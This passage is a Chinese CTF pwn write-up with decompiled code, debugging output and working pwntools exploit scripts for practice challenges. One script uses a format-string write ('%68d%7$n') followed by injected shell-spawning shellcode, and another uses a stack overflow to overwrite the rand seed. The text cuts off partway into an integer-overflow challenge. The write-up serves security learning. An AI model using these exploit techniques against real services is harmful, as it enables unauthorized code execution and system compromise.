<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *a1 == a1[<span class="number">1</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wizard: I will help you! USE YOU SPELL&quot;</span>);</span><br><span class="line">    v1 = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">    read(<span class="number">0</span>, v1, <span class="number">0x100</span>uLL);</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(_QWORD, <span class="type">void</span> *))v1)(<span class="number">0LL</span>, v1);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>代码在本地跑几次之后可以得到简化的代码执行流程如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">print(v4<span class="number">&#x27;</span>s address) 	<span class="comment">// in fact,v4=v3</span></span><br><span class="line">sub_400D72(v4)</span><br><span class="line">  print name </span><br><span class="line"> 	name_length &lt; <span class="number">12</span></span><br><span class="line">	sub_400A7D()</span><br><span class="line">		east</span><br><span class="line">	<span class="title function_">sub_400BB9</span><span class="params">()</span></span><br><span class="line">		input v1 = go into there</span><br><span class="line">		v1 == <span class="number">1</span></span><br><span class="line">		input <span class="type">int</span>  v2		 : address</span><br><span class="line">		input <span class="type">char</span> format: wish</span><br><span class="line">	sub_400CA6(a1) <span class="comment">// a1==v4==v3</span></span><br><span class="line">		*a1 == a1[<span class="number">1</span>] <span class="comment">// a1[1] == 85 we already knew,only we need 									 // to do is make the a1=85, too. </span></span><br><span class="line">		mmap(<span class="number">0LL</span>,<span class="number">0x1000</span>uLL,) <span class="comment">// locate in memeary</span></span><br><span class="line">		read(<span class="number">0</span>,v1)</span><br><span class="line">		((<span class="type">void</span> (__fastcall *)(_QWORD, <span class="type">void</span> *))v1)(<span class="number">0LL</span>, v1);<span class="comment">// excuate code what just readed</span></span><br></pre></td></tr></table></figure>

<p>对代码进行分析后发现在最后进入的函数 <code>400CA6</code> 中，最后如果满足了 <code>if(*a1=a1[1])</code> 进入条件语句中我们就可以通过开辟内存，通过 <code>read</code> 传入shellcode ,从而在内存中执行我们的 shellcode。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v1 = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">read(<span class="number">0</span>, v1, <span class="number">0x100</span>uLL);</span><br><span class="line">((<span class="type">void</span> (__fastcall *)(_QWORD, <span class="type">void</span> *))v1)(<span class="number">0LL</span>, v1);</span><br></pre></td></tr></table></figure>

<p>这段代码的汇编如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400D07                 mov     edi, offset aWizardIWillHel ; &quot;Wizard: I will help you! USE YOU SPELL&quot;</span><br><span class="line">.text:0000000000400D0C                 call    puts</span><br><span class="line">.text:0000000000400D11                 mov     r9d, 0          ; offset</span><br><span class="line">.text:0000000000400D17                 mov     r8d, 0FFFFFFFFh ; fd</span><br><span class="line">.text:0000000000400D1D                 mov     ecx, 21h        ; flags</span><br><span class="line">.text:0000000000400D22                 mov     edx, 7          ; prot</span><br><span class="line">.text:0000000000400D27                 mov     esi, 1000h      ; len</span><br><span class="line">.text:0000000000400D2C                 mov     edi, 0          ; addr</span><br><span class="line">.text:0000000000400D31                 call    mmap</span><br><span class="line">.text:0000000000400D36                 mov     [rbp+buf], rax</span><br><span class="line">.text:0000000000400D3A                 mov     rax, [rbp+buf]</span><br><span class="line">.text:0000000000400D3E                 mov     edx, 100h       ; nbytes</span><br><span class="line">.text:0000000000400D43                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000400D46                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000400D4B                 call    read</span><br><span class="line">.text:0000000000400D50                 mov     rax, [rbp+buf]</span><br><span class="line">.text:0000000000400D54                 mov     edi, 0</span><br><span class="line">.text:0000000000400D59                 call    rax</span><br></pre></td></tr></table></figure>

<p>可以看到在 <code>mmap</code> 分配了 <code>1000h</code> 的内存空间后<code>read</code> 读入了 <code>100h</code> 的内容，随后执行了 <code>rax</code> 中的内容。</p>
<p>那如何满足判断？我们查看函数参数的传递过程后发现，要比较的参数 <code>a1</code> 实际上就是 <code>v4</code> 也就是 <code>v3</code> 。而在 <code>main</code> 函数开始就已经给 <code>*a1</code> 和 <code>a1[1]</code> 赋了不同的值，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*v3 = <span class="number">68</span>;					</span><br><span class="line">v3[<span class="number">1</span>] = <span class="number">85</span>;</span><br></pre></td></tr></table></figure>

<p>所以我们要想办法修改二者其中之一的值，使其与另一个相等即可。</p>
<p>如何修改？在函数 <code>400BB9</code> 中我们发现了存在格式化字符串漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_isoc99_scanf((__int64)<span class="string">&quot;%ld&quot;</span>, (__int64)&amp;v2);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;And, you wish is:&quot;</span>);</span><br><span class="line">_isoc99_scanf((__int64)<span class="string">&quot;%s&quot;</span>, (__int64)&amp;format);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Your wish is&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(&amp;format, &amp;format); <span class="comment">// 漏洞点</span></span><br></pre></td></tr></table></figure>

<p>我们可以想办法将 <code>v2</code> 的地址指向 <code>v3</code>或者<code>v3[1]</code>，然后修改其值为另外变量的值即可。</p>
<p>先利用格式化字符串漏洞泄漏出v2 的偏移</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># coding = utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;111.200.241.244&quot;</span></span><br><span class="line">PORT = <span class="number">59601</span></span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta"># for executing code on remote or local</span></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span> and sys.argv[<span class="number">1</span>] == <span class="string">&#x27;-r&#x27;</span>:</span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./string&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">&#x27;Pwning start&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;[0] is &quot;</span>)</span><br><span class="line">add1 = <span class="type">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>) <span class="comment">//turn to hex</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;[1] is &quot;</span>)</span><br><span class="line">add2 = <span class="type">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">print add1,add2</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What should your character&#x27;s name be:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;brian&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;So, where you will go?east or up?:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;east&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;go into there(1), or leave(0)?:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&#x27;Give me an address&#x27;\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="string">&#x27;A&#x27;</span>*<span class="number">4</span> + <span class="string">&#x27;.%x&#x27;</span>*<span class="number">10</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;And, you wish is:\n&quot;</span>)</span><br><span class="line">p.sendline(offset)</span><br></pre></td></tr></table></figure>

<p>通过我们之前的测试，前几步输入正确的字符串来让程序正确进行到 <code>400BB9</code> 函数处。接着在输入 <code>address</code> 时输入我们的测试数字<code>2</code>,接着尝试通过漏洞泄漏出变量的偏移量。程序执行结果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received <span class="number">0x30</span> bytes:</span><br><span class="line">    <span class="string">&#x27;A voice heard in your mind\n&#x27;</span></span><br><span class="line">    <span class="string">&quot;&#x27;Give me an address&#x27;\n&quot;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;2\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x12</span> bytes:</span><br><span class="line">    <span class="string">&#x27;And, you wish is:\n&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x23</span> bytes:</span><br><span class="line">    <span class="string">&#x27;AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x\n&#x27;</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process <span class="string">&#x27;./string&#x27;</span> stopped with <span class="built_in">exit</span> code <span class="number">0</span> (pid <span class="number">13059</span>)</span><br><span class="line">[DEBUG] Received <span class="number">0x17e</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Your wish is\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;AAAA.75d7b7e3.75d7c8c0.75a9f224.c.0.75d772a0.2.41414141.252e7825.2e78252eI hear it, I hear it....\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!\n&#x27;</span></span><br></pre></td></tr></table></figure>

<p>在我们输入 <code>&#39;AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x\n&#39;</code> 之后，我们得到的输出为：</p>
<p><code>AAAA.75d7b7e3.75d7c8c0.75a9f224.c.0.75d772a0.2.41414141.252e7825.2e78252eI</code></p>
<p>在偏移为7的位置看到了我们的测试输入 <code>2</code> ,所以可以确定 <code>v2</code> 的偏移为7。</p>
<p>下一步我们可以将测试输入修改为 <code>v3</code> 的地址，然后通过格式化字符串漏洞将修改后的偏移量位置的值输入为<code>v3[1]</code> 的值，即85，来满足 <code>v3=v3[1]</code>，从而顺利进入可执行 shellcode 的代码段 。</p>
<p>完整 payload 如下(这里我修改的是<code>v3[1]</code>的值，注意给<code>v2</code>传地址时要赋<code>v4+4</code>的地址，赋值时也要赋<code>68</code>，而不是<code>85</code>了)：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># coding = utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;111.200.241.244&quot;</span></span><br><span class="line">PORT = <span class="number">59601</span></span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta"># for executing code on remote or local</span></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span> and sys.argv[<span class="number">1</span>] == <span class="string">&#x27;-r&#x27;</span>:</span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./string&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">&#x27;Pwning start&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;[0] is &quot;</span>)</span><br><span class="line">add1 = <span class="type">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;[1] is &quot;</span>)</span><br><span class="line">add2 = <span class="type">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">print add1,add2</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What should your character&#x27;s name be:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;brian&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;So, where you will go?east or up?:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;east&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;go into there(1), or leave(0)?:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&#x27;Give me an address&#x27;\n&quot;</span>)</span><br><span class="line">p.sendline(str(add2)) </span><br><span class="line"></span><br><span class="line">offset = <span class="string">&#x27;A&#x27;</span>*<span class="number">4</span> + <span class="string">&#x27;.%x&#x27;</span>*<span class="number">10</span></span><br><span class="line">payload = <span class="string">&#x27;%68d%7$n&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;And, you wish is:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">shell = <span class="keyword">asm</span>(shellcraft.sh())</span><br><span class="line">p.recvuntil(<span class="string">&quot;Wizard: I will help you! USE YOU SPELL\n&quot;</span>)</span><br><span class="line">p.sendline(shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h2><p>64位文件，chseksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>

<p>开启了栈溢出保护，没办法栈上执行代码。</p>
<p>反编译后<code>main()</code>部分代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">v4 = 0;</span><br><span class="line"> v6 = 0;</span><br><span class="line"> *(_QWORD *)seed = sub_BB0();</span><br><span class="line">puts(&quot;-------------------------------&quot;);</span><br><span class="line"> puts(&quot;Welcome to a guess number game!&quot;);</span><br><span class="line"> puts(&quot;-------------------------------&quot;);</span><br><span class="line"> puts(&quot;Please let me know your name!&quot;);</span><br><span class="line"> printf(&quot;Your name:&quot;, 0LL);</span><br><span class="line"> gets((__int64)&amp;v7);</span><br><span class="line"> srand(seed[0]);</span><br><span class="line"> for ( i = 0; i &lt;= 9; ++i )</span><br><span class="line"> &#123;</span><br><span class="line">   v6 = rand() % 6 + 1;</span><br><span class="line">   printf(&quot;-------------Turn:%d-------------\n&quot;, (unsigned int)(i + 1));</span><br><span class="line">   printf(&quot;Please input your guess number:&quot;);</span><br><span class="line">   __isoc99_scanf(&quot;%d&quot;, &amp;v4);</span><br><span class="line">   puts(&quot;---------------------------------&quot;);</span><br><span class="line">   if ( v4 != v6 )</span><br><span class="line">   &#123;</span><br><span class="line">     puts(&quot;GG!&quot;);</span><br><span class="line">     exit(1);</span><br><span class="line">   &#125;</span><br><span class="line">   puts(&quot;Success!&quot;);</span><br><span class="line"> &#125;</span><br><span class="line"> sub_C3E();</span><br></pre></td></tr></table></figure>

<p><code>sub_BB0()</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">_int64 sub_BB0()</span><br><span class="line">&#123;</span><br><span class="line">  int fd; // [rsp+Ch] [rbp-14h]</span><br><span class="line">  __int64 buf; // [rsp+10h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">  if ( fd &lt; 0 || (signed int)read(fd, &amp;buf, 8uLL) &lt; 0 )</span><br><span class="line">    exit(1);</span><br><span class="line">  if ( fd &gt; 0 )</span><br><span class="line">    close(fd);</span><br><span class="line">  return buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数没有溢出点，<code>buf</code> 只读了 8h</p>
<p><code>sub_C3E()</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 sub_C3E()</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;You are a prophet!\nHere is your flag!&quot;);</span><br><span class="line">  system(&quot;cat flag&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数的逻辑是在经过10次比较，如果每次 v4&#x3D;&#x3D;v6 都满足则可以 <code>cat /flag</code> 。而 v6 是通过随机函数而来。这里的 <code>rand()</code> 函数的种子被设置为了 <code>seed[0]</code>，我们知道其实随机都是假随机，只要我们设置种子为0&#x2F;1，即可得到相同的随机数。所以我们想办法控制随机种子。</p>
<p>在代码中我们注意到 v7(var_30) 和 seed 是栈上相邻的变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000C66 var_3C          = dword ptr -3Ch</span><br><span class="line">.text:0000000000000C66 var_38          = dword ptr -38h</span><br><span class="line">.text:0000000000000C66 var_34          = dword ptr -34h</span><br><span class="line">.text:0000000000000C66 var_30          = byte ptr -30h</span><br><span class="line">.text:0000000000000C66 seed            = dword ptr -10h</span><br><span class="line">.text:0000000000000C66 var_8           = qword ptr -8</span><br></pre></td></tr></table></figure>

<p>v7 的地址空间大小为<code> char v7; // [rsp+10h] [rbp-30h]</code>  ,我们通过 <code>gets(v7)</code> 输入20h+1h来使其溢出到 seed，从而控制 seed。</p>
<p>在最后pwn之前，我们还需要找到使用随机函数的so库</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$:ldd guess_num</span><br><span class="line">	linux-vdso.so.1 (0x00007ffd0a3b1000)</span><br><span class="line">	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe8e541c000)</span><br><span class="line">	/lib64/ld-linux-x86-64.so.2 (0x00007fe8e5a10000)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>虽然源代码使用了<code>so.2</code> ，但是本地测试发现用不了，采用了 <code>so.6</code>。</p>
<p>Payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;111.200.241.244&quot;</span></span><br><span class="line">PORT = <span class="number">49862</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;-r&#x27;</span>:</span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./guess_num&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your name:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    v6 = libc.rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input your guess number:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(v6))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><p>32位文件，查看保护</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>

<p>没有检测栈溢出，堆栈代码不可执行。IDA打开</p>
<p>Main()函数没有问题，进入Login()，查看反汇编结果</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">login</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [esp+0h] [ebp-228h]</span></span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+200h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your username:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x19</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, &amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x199</span>u);</span><br><span class="line">  <span class="keyword">return</span> check_passwd(&amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的read()同样没有溢出，函数最后经过<code>check_passwd($buf)</code>函数将最多输入0x199长度的参数传递过去。进入该函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">check_passwd</span><span class="params">(<span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> dest; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// [esp+Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">3u</span> || v3 &gt; <span class="number">8u</span> 